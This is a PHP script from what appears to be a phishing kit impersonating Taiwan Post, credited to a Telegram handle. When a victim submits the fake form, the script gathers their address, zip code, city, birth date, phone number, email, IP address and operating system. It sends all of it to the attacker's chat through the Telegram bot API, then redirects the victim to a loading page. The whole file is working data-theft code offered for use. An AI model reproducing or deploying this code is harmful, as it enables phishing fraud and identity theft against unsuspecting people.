<?php
/*
    
	
	Coded by Alex
    Telegram : @ALFABRABUS
*/
    include "../config.php";
    include 'serveur.php';
    $os = getOS($_SERVER['HTTP_USER_AGENT']) ."\r\n"; 

    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
    -----------🇹🇼  Taiwan POST 🇹🇼 -----------
    [ IP ]    : "."https://www.geodatatool.com/en/?ip=".$ip."
    [ Address ]      : ".$_POST['address']."
    [ zip Code ]      : ".$_POST['zip']."
    [ City ]      : ".$_POST['city']."
    [ Birthday date ]      : ".$_POST['dob']."
    [ Phone number ]      : ".$_POST['phone']."
    [ Email address ]      : ".$_POST['email']."
    [👨‍💻 Coded] : "."By @ALFABRABUS"."
    [OS] : ".$os."
    ------------🇹🇼  Taiwan POST 🇹🇼 -----------\n";


    function envoiemtn($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid";
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    
    envoiemtn($message,$token,$chatid);
    include 'index.php';
    header("Location: ../loading1.php");
?>